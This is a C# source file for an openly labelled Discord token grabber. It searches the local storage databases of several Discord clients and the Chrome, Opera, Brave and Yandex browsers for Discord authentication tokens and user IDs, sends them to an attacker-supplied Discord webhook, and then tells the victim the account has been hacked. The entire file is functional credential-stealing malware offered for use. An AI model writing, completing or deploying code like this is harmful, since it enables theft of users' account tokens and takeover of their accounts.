using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Web;
using System.Net;
using System.Text;
using System.Threading;
using System.Collections.Specialized;

namespace DiscordTokenGraber
{
    public class Program
    {
        public static void Main()
        {
            new DiscordToken();
            DiscordToken.sendToken("YOUR WEB HOOK HERE");
            Console.WriteLine("You discord account have been hacked!");
            Console.Read();
        }
    }
    public class DiscordToken
    {
        public static void sendToken(string WebHook)
        {
            using (dWebHook dcWeb = new dWebHook())
            {
                dcWeb.ProfilePicture = "https://discord.bots.gg/img/logo_transparent_coloured.png";
                dcWeb.UserName = "Catover203 Token Grabber Bot";
                dcWeb.WebHook = WebHook;
                dcWeb.SendMessage("Some token are in ur hand UserID: [" + GetID() + "] Token: [" + GetToken() + "]");
            }
        }
        public static string GetToken()
        {
            string ds_token = "";
            var files = readToken();
            return files.Substring(20, 59);
        }
        public static string GetID()
        {
            string ds_token = "";
            var files = readID();
            return files.Substring(20, 59);
        }
        private static string get_file(int index)
        {
            string LevelDB = "\\Local Storage\\leveldb\\";

            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            string discord = roaming + "\\discord" + LevelDB;
            string Chrome = local + "\\Google\\Chrome\\User Data\\Default" + LevelDB;
            string DiscordPTB = roaming + "\\discordptb" + LevelDB;
            string DiscordCanary = roaming + "\\discordcanary" + LevelDB;
            string Opera = roaming + "\\Opera Software\\Opera Stable" + LevelDB;
            string Brave = local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default" + LevelDB;
            string Yandex = local + "\\Yandex\\YandexBrowser\\User Data\\Default" + LevelDB;
            string MainFile = "";
            if (index == 1)
            {
                MainFile = discord;
            }
            if (index == 2)
            {
                MainFile = Chrome;
            }
            if (index == 3)
            {
                MainFile = DiscordPTB;
            }
            if (index == 4)
            {
                MainFile = DiscordCanary;
            }
            if (index == 5)
            {
                MainFile = Opera;
            }
            if (index == 6)
            {
                MainFile = Brave;
            }
            if (index == 7)
            {
                MainFile = Yandex;
            }
            if (Directory.Exists(MainFile))
            {
                return MainFile;
            }
            else
            {
                return "NA";
            }
        }
        private static string readToken()
        {
            string line;
            string MainFile = "";
            string returnValue = "";
            for (int i = 1; i < 7; i++)
            {
                if (get_file(i) != "NA")
                {
                    MainFile = get_file(i);
                }
            }
            foreach (string file in Directory.GetFiles(MainFile, "*.ldb", SearchOption.TopDirectoryOnly))
            {
                System.IO.StreamReader MasterToken = new System.IO.StreamReader(file);
                while ((line = MasterToken.ReadLine()) != null)
                {
                    if (Regex.Match(line, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}").Success)
                    {
                        returnValue = line;
                    }
                }
                MasterToken.Close();
            }
            return returnValue;
        }
        private static string readID()
        {
            string line;
            string MainFile = "";
            string returnValue = "";
            for (int i = 1; i < 7; i++)
            {
                if (get_file(i) != "NA")
                {
                    MainFile = get_file(i);
                }
            }
            foreach (string file in Directory.GetFiles(MainFile, "*.ldb", SearchOption.TopDirectoryOnly))
            {
                System.IO.StreamReader MasterID = new System.IO.StreamReader(file);
                while ((line = MasterID.ReadLine()) != null)
                {
                    if (Regex.Match(line, @"[0-9]{18}").Success)
                    {
                        returnValue = line;
                    }
                }
                MasterID.Close();
            }
            return returnValue;
        }
    }
    public class dWebHook : IDisposable
    {
        private readonly WebClient dWebClient;
        private static NameValueCollection discordValues = new NameValueCollection();
        public string WebHook { get; set; }
        public string UserName { get; set; }
        public string ProfilePicture { get; set; }

        public dWebHook()
        {
            dWebClient = new WebClient();
        }


        public void SendMessage(string msgSend)
        {
            discordValues.Add("username", UserName);
            discordValues.Add("avatar_url", ProfilePicture);
            discordValues.Add("content", msgSend);

            dWebClient.UploadValues(WebHook, discordValues);
        }

        public void Dispose()
        {
            dWebClient.Dispose();
        }
    }
}
